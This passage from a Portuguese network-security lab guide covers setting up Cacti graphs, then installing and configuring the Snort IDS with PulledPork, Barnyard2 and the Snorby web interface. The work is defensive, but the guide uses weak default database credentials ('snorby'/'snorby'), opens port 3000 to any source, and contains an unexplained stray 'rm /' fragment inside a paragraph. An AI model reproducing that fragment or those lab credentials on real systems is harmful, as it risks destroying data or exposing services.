<img src="./img/cacti-cgraphs2.png" alt="cacti cgraphs2">
</div>
<div class="title">Figure 59. Adicionando gráficos no Cacti, parte 2</div>
</div>
<div class="paragraph">
<p>Agora, o passo final é adicionar os gráficos a uma árvore de gráficos. No menu à esquerda, clique em <em>Graph Trees</em>, e em seguida em <em>Default Tree</em>.</p>
</div>
<div id="img-cacti-addtree" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/cacti-addtree.png" alt="cacti addtree">
</div>
<div class="title">Figure 60. Adicionando gráficos a árvores no Cacti, parte 1</div>
</div>
<div class="paragraph">
<p>Na nova janela, em <em>Tree Items</em>, clique em <em>Add</em>.</p>
</div>
<div id="img-cacti-addtree2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/cacti-addtree2.png" alt="cacti addtree2">
</div>
<div class="title">Figure 61. Adicionando gráficos a árvores no Cacti, parte 2</div>
</div>
<div class="paragraph">
<p>Na nova janela, em <em>Tree Item Type</em>, altere o valor para <em>Host</em>. Novas opções irão surgir. Em <em>Host</em>, selecione a máquina <em>FWGW1-G</em>, e depois clique em <em>Create</em>.</p>
</div>
<div id="img-cacti-addtree3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/cacti-addtree3.png" alt="cacti addtree3">
</div>
<div class="title">Figure 62. Adicionando gráficos a árvores no Cacti, parte 3</div>
</div>
<div class="paragraph">
<p>Para visualizar os gráficos recém-criados, no menu superior acesse <em>graphs</em>, expanda a <em>Default Tree</em> e clique no <em>host</em> <em>FWGW1-G</em>. Pode demorar algum tempo para que os gráficos sejam populados.</p>
</div>
<div id="img-cacti-viewgraph" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/cacti-viewgraph.png" alt="cacti viewgraph">
</div>
<div class="title">Figure 63. Visualizando gráficos no Cacti, máquina <em>FWGW1-G</em></div>
</div>
</li>
<li>
<p>Faça o mesmo procedimento realizado no passo (8), mas agora com a máquina <em>WinServer-G</em>. A única diferença é que você irá apontar o IP da máquina <em>WinServer-G</em> no campo <em>Hostname</em>, e o <em>Host Template</em> como sendo <em>Windows 2000/XP Host</em>. Ao final do processo, os gráficos deverão ficar visíveis como se segue.</p>
<div id="img-cacti-viewgraph2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/cacti-viewgraph2.png" alt="cacti viewgraph2">
</div>
<div class="title">Figure 64. Visualizando gráficos no Cacti, máquina <em>WinServer-G</em></div>
</div>
</li>
</ol>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sessão_5_sistema_de_detecçãoprevenção_de_intrusos">Sessão 5: Sistema de detecção/prevenção de intrusos</h2>
<div class="sectionbody">
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Todas as atividades desta sessão serão realizadas na máquina virtual <em>FWGW1-G</em>, com pequenas exceções destacadas no enunciado de cada exercício.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect2">
<h3 id="_1_instalação_do_snort">1) Instalação do Snort</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>A seção 1.5 do manual oficial do Snort, <em>Packet Acquisition</em>, alerta para o fato que duas características de placas de rede e de processamento do kernel Linux podem afetar negativamente o funcionamento do IDS: LRO (<em>large receive offload</em>) e GRO (<em>generic receive offload</em>). Em particular, o fato de que as placas de rede podem remontar pacotes antes do processamento do kernel pode ser problemático, pois o Snort trunca pacotes maiores que o <em>snaplen</em> de 1518 bytes; em adição a isso, essas <em>features</em> podem causar problemas com a remontagem de fluxo orientada a alvo [1] do Snort.</p>
<div class="paragraph">
<p>Na máquina <em>FWGW1-G</em>, instale o pacote <code>ethtool</code> e desative as <em>features</em> <code>lro</code> e <code>gro</code> da interface <code>enp0s3</code>. Se houver algum erro desativando as características, não se preocupe; siga para o próximo passo.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install ethtool</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ethtool -K enp0s3 gro off
# ethtool -K enp0s3 lro off
Cannot change large-receive-offload</pre>
</div>
</div>
</li>
<li>
<p>Agora, vamos instalar o Snort. Execute:</p>
<div class="literalblock">
<div class="content">
<pre># apt-get install snort</pre>
</div>
</div>
<div class="paragraph">
<p>Durante a configuração do pacote, responda as perguntas como se segue. Se sua máquina for do grupo <code>B</code>, customize as faixas de endereços IP mostradas na tabela.</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 13. Configurações do Snort durante a instalação</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Pergunta</th>
<th class="tableblock halign-left valign-top">Parâmetro</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Interface(s) que o Snort deve escutar</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">enp0s3</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Gama de endereços para a rede local</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">172.16.1.0/24,10.1.1.0/24</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>O arquivo de configuração principal do Snort é o <code>/etc/snort/snort.conf</code>. No Debian, em particular, há também o arquivo <code>/etc/snort/snort.debian.conf</code> que define algumas variáveis em particular, como mostrado abaixo:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/snort/snort.debian.conf | grep -v '^#'

DEBIAN_SNORT_STARTUP="boot"
DEBIAN_SNORT_HOME_NET="172.16.1.0/24,10.1.1.0/24"
DEBIAN_SNORT_OPTIONS=""
DEBIAN_SNORT_INTERFACE="enp0s3"
DEBIAN_SNORT_SEND_STATS="true"
DEBIAN_SNORT_STATS_RCPT="root"
DEBIAN_SNORT_STATS_THRESHOLD="1"</pre>
</div>
</div>
</li>
<li>
<p>Teste o funcionamento do Snort.</p>
<div class="literalblock">
<div class="content">
<pre># snort -V

   ,,_     -*&gt; Snort! &lt;*-
  o"  )~   Version 2.9.7.0 GRE (Build 149)
   ''''    By Martin Roesch &amp; The Snort Team: http://www.snort.org/contact#team
           Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved.
           Copyright (C) 1998-2013 Sourcefire, Inc., et al.
           Using libpcap version 1.8.1
           Using PCRE version: 8.39 2016-06-14
           Using ZLIB version: 1.2.8</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_configuração_inicial_do_snort">2) Configuração inicial do Snort</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiramente, vamos desabilitar (via comentários) todas as regras padrão do Snort instaladas pelo gerenciador de pacotes. Iremos, em um passo futuro, usar o PulledPork para atualizar as regras pela Internet.</p>
<div class="literalblock">
<div class="content">
<pre># sed -i 's/^\(include \$RULE\_PATH.*\)/#\1/' /etc/snort/snort.conf</pre>
</div>
</div>
</li>
<li>
<p>Descomente a linha que habilita regras customizadas locais, que usaremos em breve para testar o funcionamento do Snort.</p>
<div class="literalblock">
<div class="content">
<pre># sed -i 's/^\#\(include \$RULE\_PATH\/local\.rules\)/\1/' /etc/snort/snort.conf</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^include \$RULE\_PATH\/local\.rules' /etc/snort/snort.conf
include $RULE_PATH/local.rules</pre>
</div>
</div>
</li>
<li>
<p>Remova a palavra-chave <code>nostamp</code> da saída de eventos do Snort, de forma que os arquivos de log sejam identificados pelo <em>timestamp</em> de criação do arquivo.</p>
<div class="literalblock">
<div class="content">
<pre># sed -i 's/^\(output unified2.*\) nostamp,\(.*\)/\1\2/'g /etc/snort/snort.conf</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^output unified2' /etc/snort/snort.conf
output unified2: filename snort.log, limit 128, mpls_event_types, vlan_event_types</pre>
</div>
</div>
</li>
<li>
<p>Teste o arquivo de configuração do Snort procurando por erros de sintaxe. Se tudo estiver correto, a penúltima linha deverá dizer <code>Snort successfully validated the configuration!</code>.</p>
<div class="literalblock">
<div class="content">
<pre># snort -T -c /etc/snort/snort.conf</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>(...)
Snort successfully validated the configuration!
Snort exiting</pre>
</div>
</div>
</li>
<li>
<p>Vamos criar uma regra customizada no Snort para testar se tudo está a contento. No arquivo <code>/etc/snort/rules/local.rules</code>, insira a linha:</p>
<div class="literalblock">
<div class="content">
<pre>alert icmp any any -&gt; any any (msg:"ICMP packet from all, to all"; sid:10000001; rev:001;)</pre>
</div>
</div>
<div class="paragraph">
<p>Esta regra irá simplesmente levantar um alerta se o Snort detectar um pacote ICMP vindo de qualquer IP, qualquer porta, para qualquer IP, qualquer porta.</p>
</div>
</li>
<li>
<p>Descubra o IP público da máquina <em>FWGW1-G</em>:</p>
<div class="literalblock">
<div class="content">
<pre># ip a s enp0s3 | grep '^ *inet ' | awk '{ print $2 }'
192.168.29.103/24</pre>
</div>
</div>
<div class="paragraph">
<p>Agora, vamos rodar o Snort em modo console e testar o funcionamento da regra.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># snort -A console -q -g snort -u snort -c /etc/snort/snort.conf -i enp0s3</pre>
</div>
</div>
<div class="paragraph">
<p>Em sua máquina física, envie alguns pacotes ICMP para o IP público da máquina <em>FWGW1-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>C:\&gt;ping 192.168.29.103

Pinging 192.168.29.103 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 192.168.29.103:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),</pre>
</div>
</div>
<div class="paragraph">
<p>De volta à máquina <em>FWGW1-G</em>, note que o Snort gerou registros para cada um dos pacotes recebidos, como esperado:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>09/04-09:10:33.691493  [**] [1:10000001:1] ICMP packet from all, to all [**] [Priority: 0] {ICMP} 192.168.29.102 -&gt; 192.168.29.103
09/04-09:10:38.278164  [**] [1:10000001:1] ICMP packet from all, to all [**] [Priority: 0] {ICMP} 192.168.29.102 -&gt; 192.168.29.103
09/04-09:10:43.279523  [**] [1:10000001:1] ICMP packet from all, to all [**] [Priority: 0] {ICMP} 192.168.29.102 -&gt; 192.168.29.103
09/04-09:10:48.283261  [**] [1:10000001:1] ICMP packet from all, to all [**] [Priority: 0] {ICMP} 192.168.29.102 -&gt; 192.168.29.103</pre>
</div>
</div>
<div class="paragraph">
<p>Observe, ainda, que os ICMP <code>echo-reply</code> enviados por sua máquina física não foram respondidos porque o firewall interno permite tráfego ICMP oriundo apenas das redes 172.16.1.0/24 e 10.1.1.0/24, como configurado na sessão 3.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -vn -L INPUT | grep ' prot\|icmp '
 pkts bytes target     prot opt in     out     source               destination
    1    84 ACCEPT     icmp --  *      *       172.16.1.0/24        0.0.0.0/0            icmptype 255
    0     0 ACCEPT     icmp --  *      *       10.1.1.0/24          0.0.0.0/0            icmptype 255</pre>
</div>
</div>
<div class="paragraph">
<p>Finalize o Snort com CTRL+C, e comente a regra inserida no arquivo <code>/etc/snort/rules/local.rules</code>.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_configurando_atualizações_de_regras_de_forma_automática_com_o_pulledpork">3) Configurando atualizações de regras de forma automática com o PulledPork</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>O programa PulledPork nos permite receber definições de regras atualizadas periodicamente pela Internet, sempre que novas vulnerabilidade e <em>exploits</em> forem descobertos e divulgados.</p>
<div class="paragraph">
<p>Primeiro, vamos instalar as dependências do PulledPork:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>apt-get install git                              \
                libcrypt-ssleay-perl             \
                liblwp-useragent-determined-perl</pre>
</div>
</div>
</li>
<li>
<p>Crie o diretório <code>/root/src</code>, se não existir, e faça o download do código-fonte do PulledPork. Em seguida, copie seus binários e arquivos de configuração para os locais apropriados.</p>
<div class="literalblock">
<div class="content">
<pre># mkdir ~/src
# cd ~/src</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># git clone --depth 1 https://github.com/shirkdog/pulledpork.git
Cloning into 'pulledpork'...
remote: Counting objects: 1323, done.
remote: Total 1323 (delta 0), reused 0 (delta 0), pack-reused 1323
Receiving objects: 100% (1323/1323), 331.28 KiB | 343.00 KiB/s, done.
Resolving deltas: 100% (884/884), done.
Checking connectivity... done.</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cd pulledpork/</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cp pulledpork.pl /usr/local/bin/
# chmod +x /usr/local/bin/pulledpork.pl</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cp ./etc/*.conf /etc/snort</pre>
</div>
</div>
</li>
<li>
<p>Crie os diretórios e arquivos de configuração padrão do PulledPork, vazios.</p>
<div class="literalblock">
<div class="content">
<pre># mkdir /etc/snort/rules/iplists
# touch /etc/snort/rules/iplists/default.blacklist</pre>
</div>
</div>
</li>
<li>
<p>Teste o funcionamento do PulledPork, verificando sua versão.</p>
<div class="literalblock">
<div class="content">
<pre># pulledpork.pl -V
PulledPork v0.7.4 - Helping you protect your bitcoin wallet!</pre>
</div>
</div>
</li>
<li>
<p>Vamos agora configurar o PulledPork. O primeiro passo é a obtenção de um <em>Oinkcode</em>, que é basicamente um número de registro com o <code>snort.org</code> que nos permitirá o download de listas de regras geradas pela comunidade.</p>
<div class="openblock">
<div class="content">
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Acesse <a href="https://www.snort.org/" class="bare">https://www.snort.org/</a> , e clique em <em>Sign In</em> no canto superior direito.</p>
</li>
<li>
<p>Se você não possuir uma conta, clique em <em>Sign up</em>.</p>
</li>
<li>
<p>Preencha os campos <em>Email</em> (use um email válido e acessível), <em>Password</em> e <em>Password confirmation</em>, marque a caixa <em>Agree to Snort license</em> e finalmente clique em <em>Sign up</em>.</p>
</li>
<li>
<p>Acesse o e-mail informado no passo (3). Dentro de algum tempo, você deverá receber uma mensagem com o título <em>Confirmation instructions</em>. Abra-a e clique no link <em>Confirm my account</em>.</p>
</li>
<li>
<p>Com a conta confirmada, faça login no site <a href="https://www.snort.org/" class="bare">https://www.snort.org/</a> usando os dados informados anteriormente.</p>
</li>
<li>
<p>No canto superior direito da página, clique no seu e-mail cadastrado, logo ao lado do ícone de logout.</p>
</li>
<li>
<p>Na nova página, clique no menu <em>Oinkcode</em>. Deverá aparecer uma <em>string</em> de cerca de 40 caracteres no centro da tela. Copie-a, pois a usaremos em seguida.</p>
</li>
</ol>
</div>
</div>
</div>
</li>
<li>
<p>Com o <em>Oinkcode</em> em mãos, vamos configurar o PulledPork. No comando abaixo, substitua o valor <code>OINKCODE</code> no começo do comando pelo código que você copiou no item (7) do passo anterior. Em seguida, execute-o no terminal.</p>
<div class="literalblock">
<div class="content">
<pre># oc="OINKCODE" ; sed -i "s/^\(rule\_url\=https\:\/\/www\.snort\.org\/reg\-rules\/|snortrules\-snapshot\.tar\.gz|\).*/\1${oc}/" /etc/snort/pulledpork.conf ; unset oc</pre>
</div>
</div>
<div class="paragraph">
<p>Se tudo deu certo, você deverá ver seu <em>Oinkcode</em> ao final da linha de regras baixadas do site <a href="https://www.snort.org" class="bare">https://www.snort.org</a> , como mostrado a seguir (nota: o <em>Oinkcode</em> abaixo é fictício):</p>
</div>
<div class="literalblock">
<div class="content">
<pre># grep 'rule_url=https://www.snort.org/reg-rules' /etc/snort/pulledpork.conf
rule_url=https://www.snort.org/reg-rules/|snortrules-snapshot.tar.gz|13eba036f37e80d0efb689c60af9e6daae810763</pre>
</div>
</div>
<div class="paragraph">
<p>+rm /
Substitua todas as instâncias de <code>/usr/local/etc</code> por <code>/etc</code>, e <code>/usr/local/lib</code> por <code>/usr/lib</code>, para refletir corretamente o diretório de armazenamento de configurações e bibliotecas do Snort:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># sed -i 's/\/usr\/local\/etc/\/etc/g' /etc/snort/pulledpork.conf
# sed -i 's/\/usr\/local\/lib/\/usr\/lib/g' /etc/snort/pulledpork.conf</pre>
</div>
</div>
<div class="paragraph">
<p>Corrija o local do binário do Snort, de <code>/usr/local/bin/snort</code> para o valor correto, que é <code>/usr/sbin/snort</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># sed -i 's/\/usr\/local\/bin\/snort/\/usr\/sbin\/snort/g' /etc/snort/pulledpork.conf</pre>
</div>
</div>
<div class="paragraph">
<p>Finalmente, falta substituir a distribuição-alvo padrão do PulledPork:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># sed -i 's/^\(distro=\).*/\1Debian-6-0/' /etc/snort/pulledpork.conf</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^distro=' /etc/snort/pulledpork.conf
distro=Debian-6-0</pre>
</div>
</div>
</li>
<li>
<p>Vamos testar as configurações do PulledPork, e fazer o download das listas de regras mais atualizadas.</p>
<div class="literalblock">
<div class="content">
<pre># pulledpork.pl -c /etc/snort/pulledpork.conf -l</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>    https://github.com/shirkdog/pulledpork
      _____ ____
     `----,\    )
      `--==\\  /    PulledPork v0.7.4 - Helping you protect your bitcoin wallet!
       `--==\\/
     .-~~~~-.Y|\\_  Copyright (C) 2009-2017 JJ Cummings, Michael Shirk
  @_/        /  66\_  and the PulledPork Team!
    |    \   \   _(")
     \   /-| ||'--'  Rules give me wings!
      \_\  \_\\
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

(...)

Rule Stats...
        New:-------34178
        Deleted:---0
        Enabled Rules:----10999
        Dropped Rules:----0
        Disabled Rules:---23179
        Total Rules:------34178
IP Blacklist Stats...
        Total IPs:-----1382

Done
Please review /var/log/sid_changes.log for additional details
Fly Piggy Fly!</pre>
</div>
</div>
<div class="paragraph">
<p>Se tudo deu certo, o PulledPork deve ter consolidado as regras baixadas no arquivo <code>/etc/snort/rules/snort.rules</code>. Verifique o tamanho e o número de linhas desse arquivo.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># du -sk /etc/snort/rules/snort.rules
18432   /etc/snort/rules/snort.rules</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># wc -l /etc/snort/rules/snort.rules
38437 /etc/snort/rules/snort.rules</pre>
</div>
</div>
</li>
<li>
<p>Finalmente, basta indicar ao Snort que esse arquivo seja usado em sua inicialização. Insira a linha <code>include $RULE_PATH/snort.rules</code> ao final do arquivo <code>/etc/snort/snort.conf</code>.</p>
<div class="literalblock">
<div class="content">
<pre># echo 'include $RULE_PATH/snort.rules' &gt;&gt; /etc/snort/snort.conf</pre>
</div>
</div>
<div class="paragraph">
<p>Pare todas as instâncias do Snort, e remova os arquivos de log antigos. Em seguida, inicie-o, e verifique seu uso de memória.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl stop snort
# ps auxwm | grep '^snort'</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># rm /var/log/snort/snort.log*</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl start snort</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ps -eo 'rss,comm' | grep 'snort$'
995976 snort</pre>
</div>
</div>
</li>
<li>
<p>Para que as regras se mantenham atualizadas, é necessário atualizá-las periodicamente. Crie um novo arquivo no diretório <code>/etc/cron.daily</code> que atualize as regras diariamente, com o seguinte conteúdo:</p>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">#!/bin/sh

test -x /usr/local/bin/pulledpork.pl || exit 0
/usr/local/bin/pulledpork.pl -c /etc/snort/pulledpork.conf -l</code></pre>
</div>
</div>
<div class="paragraph">
<p>Verifique que o usuário/grupo dono e permissões do arquivo estão corretos.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># chown root.root /etc/cron.daily/pulledpork
# chmod 0755 /etc/cron.daily/pulledpork</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_4_processando_arquivos_de_log_do_snort_com_o_barnyard2">4) Processando arquivos de log do Snort com o Barnyard2</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Note que, por padrão, o Snort está fazendo o log de eventos registrados no arquivo <code>/var/log/snort/snort.log</code>:</p>
<div class="literalblock">
<div class="content">
<pre># grep 'snort.log' /etc/snort/snort.conf | grep -v '^#'
output unified2: filename snort.log, limit 128, mpls_event_types, vlan_event_types</pre>
</div>
</div>
<div class="paragraph">
<p>Este arquivo está no formato <code>unified2</code> que, como documentado no manual oficial do Snort (<a href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node21.html" class="bare">http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node21.html</a>), é um formato de log binário que permite ao Snort maior nível de performance ao registrar os eventos em disco. O problema, evidentemente, é que esse arquivo de log não é legível diretamente.</p>
</div>
</li>
<li>
<p>Iremos instalar e configurar o <em>Barnyard2</em> para lidar com esses arquivos de log. Como de costume, o primeiro passo é instalar as dependências do pacote:</p>
<div class="literalblock">
<div class="content">
<pre># apt-get install autoconf              \
                  build-essential       \
                  libdaq-dev            \
                  libdumbnet-dev        \
                  libmariadb-dev        \
                  libmariadb-dev-compat \
                  libpcap-dev           \
                  libprelude-dev        \
                  libtool               \
                  mariadb-server</pre>
</div>
</div>
<div class="paragraph">
<p>Em adição a isso, é necessário criar um link simbólico para a biblioteca <code>dumbnet.n</code>, como se segue:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ln -s /usr/include/dumbnet.h /usr/include/dnet.h</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ldconfig</pre>
</div>
</div>
</li>
<li>
<p>Agora, volte ao diretório de download de códigos-fonte (<code>/root/src</code>), baixe o Barnyard2, compile-o e instale:</p>
<div class="literalblock">
<div class="content">
<pre># cd ~/src</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># git clone --depth 1 https://github.com/firnsy/barnyard2.git</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cd barnyard2/</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># autoreconf -fvi -I ./m4</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ./configure --with-mysql --with-mysql-libraries=/usr/lib/x86_64-linux-gnu</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># make</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># make install</pre>
</div>
</div>
</li>
<li>
<p>Vamos agora proceder à configuração do Barnyard2. Primeiramente, vamos criar arquivos e diretórios padrão com as permissões corretas:</p>
<div class="literalblock">
<div class="content">
<pre># touch /var/log/snort/barnyard2.waldo</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># mkdir /var/log/barnyard2 /var/log/snort/archive</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># chown snort.snort /var/log/barnyard2/ /var/log/snort/archive/ /var/log/snort/barnyard2.waldo</pre>
</div>
</div>
<div class="paragraph">
<p>Em seguida, crie e edite o arquivo de configuração <code>/etc/snort/barnyard2.conf</code>, com o seguinte conteúdo:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">config sid_file:            /etc/snort/sid-msg.map
config gen_file:            /etc/snort/gen-msg.map
config reference_file:      /etc/snort/reference.config
config classification_file: /etc/snort/classification.config

config hostname:            localhost
config interface:           enp0s3

input unified2

output alert_fast
output database: log, mysql, user=snorby password=snorby dbname=snorby host=localhost</code></pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_5_visualizando_eventos_com_o_snorby">5) Visualizando eventos com o Snorby</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Precisamos de um método conveniente para visualizar e tratar os eventos registrados pelo Snort. Iremos instalar e configurar o <em>Snorby</em>, uma aplicação web criada em <em>Ruby on Rails</em> para auxiliar no trabalho de monitoramento de ferramentas IDS populares como o Snort, Suricata e Sagan. Como de costume, o primeiro passo é instalar as dependências do pacote:</p>
<div class="literalblock">
<div class="content">
<pre># apt-get install --no-install-recommends   \
                bundler                     \
                imagemagick                 \
                libmariadbclient-dev        \
                libmariadbclient-dev-compat \
                libpq-dev                   \
                libreadline-dev             \
                libssl-dev                  \
                libxml2-dev                 \
                libxslt1-dev                \
                libyaml-dev                 \
                postgresql-server-dev-9.6   \
                ruby                        \
                ruby-dev                    \
                wkhtmltopdf                 \
                zlib1g-dev</pre>
</div>
</div>
</li>
<li>
<p>Agora, volte ao diretório de download de códigos-fonte (<code>/root/src</code>), baixe o Snorby e instale suas dependências (no Ruby, conhecidas como <em>gems</em>):</p>
<div class="literalblock">
<div class="content">
<pre># cd ~/src</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># git clone --depth 1 https://github.com/Snorby/snorby.git</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cd snorby/</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># bundle install</pre>
</div>
</div>
</li>
<li>
<p>Vamos agora proceder à configuração do Snorby. Copie e renomeie os arquivos de configuração de conexão com o banco de dados (<code>config/database.yml</code>), editando-o como se segue:</p>
<div class="literalblock">
<div class="content">
<pre># cp config/database.yml.example config/database.yml</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano config/database.yml
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat config/database.yml | grep '^ *username\|password' | grep -v '^#'
  username: snorby
  password: "snorby"</pre>
</div>
</div>
<div class="paragraph">
<p>Faça o mesmo para a configuração principal do Snorby (<code>config/snorby_config.yml</code>), como mostrado abaixo:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># cp config/snorby_config.yml.example config/snorby_config.yml</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nano config/snorby_config.yml
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat config/snorby_config.yml | grep '^ *baseuri\|domain\|wkhtmltopdf\|mailer_sender\|time_zone' | head -n5
  baseuri: ''
  domain: 'snorby.FWGW1-A.intnet'
  wkhtmltopdf: /usr/bin/wkhtmltopdf
  mailer_sender: 'snorby@FWGW1-A.intnet'
  time_zone: 'America/Sao_Paulo'</pre>
</div>
</div>
<div class="paragraph">
<p>Edite apenas as configurações da seção <code>production:</code> do arquivo <code>config/snorby_config.yml</code>. As demais seções (<code>development:</code> e <code>test:</code>) não serão usadas.</p>
</div>
</li>
<li>
<p>Vamos configurar o banco de dados. Primeiro, crie uma base de dados vazia e configure suas permissões:</p>
<div class="literalblock">
<div class="content">
<pre># mysql -u root -e 'create database snorby'</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># mysql -u root</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>MariaDB [(none)]&gt; grant all on snorby.* to 'snorby'@'localhost' identified by 'snorby';
Query OK, 0 rows affected (0.00 sec)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>MariaDB [(none)]&gt; flush privileges;
Query OK, 0 rows affected (0.00 sec)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>MariaDB [(none)]&gt; quit
Bye</pre>
</div>
</div>
</li>
<li>
<p>Agora, invoque o script de <em>setup</em> do Snorby para popular a base de dados:</p>
<div class="literalblock">
<div class="content">
<pre># bundle exec rake snorby:setup</pre>
</div>
</div>
</li>
<li>
<p>O Snorby irá rodar, por padrão, na porta TCP/3000. Como não há regra permitindo esse tipo de acesso direto ao firewall, crie-a:</p>
<div class="literalblock">
<div class="content">
<pre># iptables -A INPUT -p tcp --dport 3000 -j ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables-save &gt; /etc/iptables/rules.v4</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_6_integração_dos_serviços_com_o_sistema">6) Integração dos serviços com o sistema</h3>
<div class="paragraph">
<p>Note que ainda não iniciamos nem o Barnyard2 nem o Snorby, recentemente instalados e configurados. Muito embora seja possível iniciá-los manualmente e gerenciar seus processos, isso rapidamente se torna bastante inconveniente à medida que o sistema aumenta em complexidade. Para facilitar a tarefa, iremos criar dois <em>scripts</em> de inicialização para os serviços junto ao <code>systemctl</code>. Siga os passos:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Crie um arquivo novo, <code>/etc/systemd/system/barnyard2.service</code>, com o seguinte conteúdo:</p>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">[Unit]
Description=Barnyard2 Snort log spooler
After=snort.service

[Service]
Type=simple
ExecStart=/usr/local/bin/barnyard2 -D -c /etc/snort/barnyard2.conf -d /var/log/snort -w /var/log/snort/barnyard2.waldo -l /var/log/snort -a /var/log/snort/archive -f snort.log -u snort -g snort
Restart=always

[Install]
WantedBy=multi-user.target</code></pre>
</div>
</div>
</li>
<li>
<p>Faça o mesmo para o arquivo <code>/etc/systemd/system/snorby.service</code>:</p>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">[Unit]
Description=Snorby Snort web monitoring
Requires=barnyard2.service

[Service]
Type=forking
PIDFile=/root/src/snorby/tmp/pids/server.pid
WorkingDirectory=/root/src/snorby
ExecStart=/bin/bash -lc 'bundle exec rails server -e production -d'

[Install]
WantedBy=multi-user.target</code></pre>
</div>
</div>
</li>
<li>
